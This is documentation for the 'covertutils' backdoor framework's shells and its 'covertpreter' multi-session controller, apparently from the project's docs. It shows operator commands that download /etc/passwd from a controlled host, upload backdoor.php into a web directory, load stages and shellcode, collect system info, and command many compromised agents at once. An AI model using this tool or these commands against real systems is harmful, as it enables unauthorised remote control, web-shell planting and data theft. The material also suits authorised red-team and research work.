

Shells & SubShells
==================

When a class from the :mod:`covertutils.shells` family is used to hook and interact with the :class:`Handler` object, several built-in features can be used.


The shells provided by the package are `(thank god)` **<Ctrl-C> resistant**, and modular, in a sense that no single shell interface accepts `every command`.

As the architecture of a ``covertutils`` backdoor implies, all data flows through a virtual `stream` that is identified by an OTP mechanism (see :ref:`streamidentifier_component`). The other side `(Agent)` can handle data from **different streams in different ways**.



The shell that spawns when the :meth:`covertutils.shell.BaseShell.start` method is used is almost a dummy. It runs no commands from itself. It is there to provide the `stream menu` and handle `exit commands`.
This design makes easier the creation of custom command suites, `without expanding` the parent classes (but `inheriting` from them).

Enough subshells have been created for an everyday backdoor (`shell`, `file transfer`, even `shellcode execution` see :ref:`stages_page`), but the ability to create and integrate new ones along with the existing is given through the use of a parent shell approach.


The *Session Shell*
*******************

Stream Menu
+++++++++++


The parent shell spawns the `stream menu` with a `<Ctrl-C>` - ``KeyboardInterrupt``. From there, the user can jump to SubShells to access real commands (either `OS` or `Python` or whatever is loaded at the given time).

.. code:: bash

	(127.0.0.1:58504)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - file
		[ 4] - stage
		[99] - Back
	Select stream:


Dispatching commands with ``"!"`` `(exclamation mark)`
++++++++++++++++++++++++++++++++++++++++++++++++++++++

From the `Parent Shell` it is possible to issue commands to any SubShell just by prepending the ``"!"`` and the `stream name` before the actual command.

.. code:: bash

	(127.0.0.1:58504)> !python print "Dispatching to Python Stream"
	Dispatching to Python Stream


Typing only the ``"!"`` and the `stream name` will jump to the `stream's` SubShell.

.. code:: bash

	(127.0.0.1:58504)> !python
	[python] >>>

This way SubShells with only one or two commands can be used without directly accessed.

.. code:: bash

	(127.0.0.1:58504)> !file download /etc/passwd

.. code:: bash

	(127.0.0.1:58504)> !stage fload my_custom_module.py

.. code:: bash

	(127.0.0.1:58504)> !control reset


The ``"!"`` can be used from SubShells too, making file transfers handy:

.. code:: bash

	[os-shell]> ls
	index.html

	[os-shell]> !file upload backdoor.php
	File uploaded succesfully!

	[os-shell]> ls
	index.html
	backdoor.php


Exiting
+++++++

Exiting the `Parent Shell` with ``exit`` or ``q`` or ``quit`` will make the :meth:`covertutils.shell.BaseShell.start` method to return. This design is preferred from the ``sys.exit(0)`` approach, as it leaves open the possibility of a `multi-shell`, used for session management purposes, providing features like the ``session -i`` of `meterpreter`.



.. note :: Also the :class:`covertutils.shell.impl.StandardShell` class and derivatives contain a ``sysinfo`` class variable, populated when the ``!control sysinfo`` command is first run. This variable is accessible from outside the class, providing information of the controlled system. This can be used to create a brief line similar to `meterpreter`'s ``session -l`` command.


The ``covertpreter`` Session Shell aggregator
**********************************************

Controlling a single host is **rarely the case though**! Backdoor tools are frequently expanded to RATs (Remote Administration Tools), as there are needs for multiple *Agents* being controlled *at the same time*.

``covertutils`` provides the ``covertpreter`` shell under ``covertutils.shells.multi`` subpackage, to address the need of a **a shell to rule them all**.


Session Management
++++++++++++++++++

Basically, ``covertpreter`` is a class maintaining several implementations of the ``covertutils.shells.BaseShell`` class, under an internal data structure,
dispatching commands to each of them, and letting the user '*jump*' into a currently running session.

.. code :: bash

	covertpreter> session -l
		Current Sessions:
	0) 28d4a1a19dcb924c - <class '__main__.MyHandler'>
	System Info: N/A

	1) faee224f3f61e1d7 - <class '__main__.MyHandler'>
	System Info: N/A

	covertpreter> session -i 1
	(covertutils v0.3.4)>
	(covertutils v0.3.4)> !control identity
	Sending 'ID' control command!
	0511ddb0
	(covertutils v0.3.4)>
	<Ctrl-C>
	covertpreter> session -s 28d4a1a19dcb924c
	(covertutils v0.3.4)> !control identity
	Sending 'ID' control command!
	(covertutils v0.3.4)> d72b5e5e
	<Ctrl-C>
	covertpreter>


It also possible to command all running sessions **at-once**. Or select the Sessions to dispath a command using their IDs.

.. code :: bash

	covertpreter> control reset
	No sessions selected, ALL sessions will be commanded
	Are you sure? [y/N]: y
	'!control reset' -> <28d4a1a19dcb924c>
	Reseting handler
	Sending 'RST' control command!
	'!control reset' -> <faee224f3f61e1d7>
	Reseting handler
	Sending 'RST' control command!
	OK
	OK
	covertpreter>

Selectively executing commands:

.. code :: bash

	covertpreter> 28d4a1a19dcb924c control sysinfo
	'!control sysinfo' -> <28d4a1a19dcb924c>
	Sending 'SI' control command!
	General:
		Host: hostname
		Machine: x86_64
		Version: #1 SMP Debian 4.12.6-1kali6 (2017-08-30)
		Locale: en_US-UTF-8
		Platform: Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling
		Release: 4.12.0-kali1-amd64
		System: Linux
		Processor:
		User: unused

	Specifics:
		Windows: ---
		Linux: glibc-2.7
	covertpreter>



The ``sysinfo`` information is stored for later usage in the shell which it received it.

The Sessions can be listed with (you guessed it) ``-l[v]``:

.. code :: bash

	covertpreter> session -l
		Current Sessions:
	0) 28d4a1a19dcb924c - <class '__main__.MyHandler'>
	hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused

	1) faee224f3f61e1d7 - <class '__main__.MyHandler'>
	System Info: N/A

``-v`` also lists the available streams/extensions per session:

.. code :: bash

	covertpreter> session -lv
		Current Sessions:
	0) 28d4a1a19dcb924c - <class '__main__.MyHandler'>
	hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused
		-> control
		-> python
		-> os-shell

	1) faee224f3f61e1d7 - <class '__main__.MyHandler'>
	System Info: N/A
		-> control
		-> python
		-> os-shell


The ``handler`` command of ``covertpreter``
+++++++++++++++++++++++++++++++++++++++++++

Here is where the **magic starts!**
As there is no actual network server behind ``covertutils``, and networking is intentionally left to the developer, adding sessions doesn't depend on server management/sockets/NATs etc...

Also a ``covertpreter`` instance only recognises implementations of `covertutils.shells.BaseShell`. So adding a session means adding another ``BaseShell`` object in its data structure.

So, for a freshly writtent *Handler* file, say ``handler.py``, which invokes a ``BaseShell`` derived object, named ``shell``,
and calls the ``shell.start()`` to start interacting, there is a way to be added to an already running ``covertpreter`` process.


.. code :: bash

	covertpreter> handler add -h
	usage: handler add [-h] [--shell SHELL] SCRIPT [ARGUMENTS [ARGUMENTS ...]]

	positional arguments:
	  SCRIPT                The file that contains the Handler in Python
	                        'covertutils' code
	  ARGUMENTS             The arguments passed to the Python 'covertutils'
	                        handler script

	optional arguments:
	  -h, --help            show this help message and exit
	  --shell SHELL, -s SHELL
	                        The argument in the Python code that contains the
	                        'covertutils.shell.baseshell.BaseShell' implementation

That basically means that by using a command like the following:

.. code :: bash

	covertpreter> handler add --shell shell_implementation handler.py  <arguments to handler script>

The object defined in the ``handler.py`` will get listed to the ``sessions -l`` list of ``covertpreter``,
after running the Python code found in ``handler.py`` with ``<arguments to handler script>`` as arguments.

.. note :: The ``handler.py`` won't pollute the main script's `Namespace`. It is executed in a different `Namespace` ``dict``.


The new session will be directly usable, without ``covertpreter`` depending on its transfer method, or internals...

**That's what we get if we completely abstract the networking from the backdoor development!**


Have fun with ``covertpreter``!
